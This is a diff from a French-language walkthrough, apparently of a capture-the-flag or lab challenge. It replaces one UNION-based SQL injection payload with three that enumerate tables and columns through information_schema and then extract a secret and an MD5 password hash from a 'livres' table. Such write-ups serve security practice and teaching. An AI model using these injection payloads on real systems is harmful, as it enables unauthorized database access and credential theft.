@@ -67,7 +67,13 @@ Lorsque l'ip sera bon, on aura une reponse differente de celle incorrecte. Ainsi
 
 Lire dans les livres et trouver le password.
 
- ' UNION SELECT NULL, livre, secret, NULL, NULL FROM users #
+
+' UNION SELECT NULL, NULL, NULL, table_name FROM information_schema.tables #
+
+' UNION SELECT NULL, NULL, NULL, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'livres' #
+
+' UNION SELECT NULL, nom, secret, NULL FROM livres #
+
  
  Cela renverra sur le livre de Vaynin, le password hash en MD5.
  
